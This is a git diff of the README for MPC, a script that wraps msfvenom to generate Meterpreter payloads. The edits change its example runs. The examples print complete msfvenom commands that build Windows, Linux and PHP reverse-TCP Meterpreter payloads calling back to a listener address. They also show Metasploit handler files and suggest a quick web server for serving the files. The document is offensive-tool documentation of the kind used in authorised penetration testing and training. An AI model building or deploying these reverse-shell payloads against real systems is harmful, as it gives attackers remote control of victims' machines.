@@ -1,6 +1,6 @@
 A **quick** way to generate various "basic" Meterpreter payloads via msfvenom (part of the Metasploit framework).
 
-![Msfvenom Payload Creator (MPC)](https://i.imgur.com/HfNQ4pr.png)
+![Msfvenom Payload Creator (MPC)](https://i.imgur.com/pLmIlAm.png)
 
 - - -
 
@@ -50,31 +50,15 @@ root@kali:~# mpc
 root@kali:~#
 ```
 
-## Example \#1 (Linux - Fully Automated With IP And Port)
+## Example \#1 (Windows Fully Automated With IP And Port)
 
 ```bash
-root@kali:/var/www# bash mpc.sh linux 192.168.155.175 4444
+root@kali:~# mpc windows 192.168.155.175 4444
  [*] Msfvenom Payload Creator (MPC v1.1)
  [i]   IP: 192.168.155.175
  [i] PORT: 4444
- [i] TYPE: linux (linux/x86/meterpreter/reverse_tcp)
- [i]  CMD: msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.155.175 LPORT=4444 -o /root/linux-meterpreter.elf
- [i] linux meterpreter created: '/root/linux-meterpreter.elf'
- [i] MSF handler file: '/root/linux-meterpreter-elf.rc'   (msfconsole -q -r /root/linux-meterpreter-elf.rc)
- [?] Quick web server?   python -m SimpleHTTPServer 8080
- [*] Done!
-root@kali:/var/www#
-```
-
-## Example \#2 (Windows - Fully Automated With Interface)
-
-```bash
-root@kali:~# ./mpc.sh exe eth0
- [*] Msfvenom Payload Creator (MPC v1.1)
- [i]   IP: 192.168.103.241
- [i] PORT: 443
  [i] TYPE: windows (windows/meterpreter/reverse_tcp)
- [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.103.241 LPORT=443 -o /root/windows-meterpreter.exe
+ [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.155.175 LPORT=4444 -o /root/windows-meterpreter.exe
  [i] windows meterpreter created: '/root/windows-meterpreter.exe'
  [i] MSF handler file: '/root/windows-meterpreter-exe.rc'   (msfconsole -q -r /root/windows-meterpreter-exe.rc)
  [?] Quick web server?   python -m SimpleHTTPServer 8080
@@ -82,7 +66,23 @@ root@kali:~# ./mpc.sh exe eth0
 root@kali:~#
 ```
 
-## Example \#3 (PHP - Interactive)
+## Example \#2 (Linux Fully Automated With Interface And Format)
+
+```bash
+root@kali:~# ./mpc.sh elf eth0
+ [*] Msfvenom Payload Creator (MPC v1.1)
+ [i]   IP: 127.0.0.1
+ [i] PORT: 443
+ [i] TYPE: linux (linux/x86/meterpreter/reverse_tcp)
+ [i]  CMD: msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=127.0.0.1 LPORT=443 -o /root/linux-meterpreter.elf
+ [i] linux meterpreter created: '/root/linux-meterpreter.elf'
+ [i] MSF handler file: '/root/linux-meterpreter-elf.rc'   (msfconsole -q -r /root/linux-meterpreter-elf.rc)
+ [?] Quick web server?   python -m SimpleHTTPServer 8080
+ [*] Done!
+root@kali:~#
+```
+
+## Example \#3 (PHP Using Interactive IP Menu)
 
 ```bash
 root@kali:~# bash mpc.sh php
@@ -92,18 +92,20 @@ root@kali:~# bash mpc.sh php
  [i]   1.) eth0 - 192.168.103.140
  [i]   2.) eth1 - 192.168.155.175
  [i]   3.) lo - 127.0.0.1
- [?] Select 1-3, interface or IP address: 2
+ [?] Select 1-3, interface or IP address: 1
 
- [i]   IP: 192.168.155.175
+ [i]   IP: 192.168.103.140
  [i] PORT: 443
  [i] TYPE: php (php/meterpreter/reverse_tcp)
- [i]  CMD: msfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php LHOST=192.168.155.175 LPORT=443 -o /root/php-meterpreter.php
+ [i]  CMD: msfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php LHOST=192.168.103.140 LPORT=443 -o /root/php-meterpreter.php
  [i] php meterpreter created: '/root/php-meterpreter.php'
  [i] MSF handler file: '/root/php-meterpreter-php.rc'   (msfconsole -q -r /root/php-meterpreter-php.rc)
  [?] Quick web server?   python -m SimpleHTTPServer 8080
  [*] Done!
 root@kali:~#
 ```
+
+- - -
 
 ## To-Do List
 
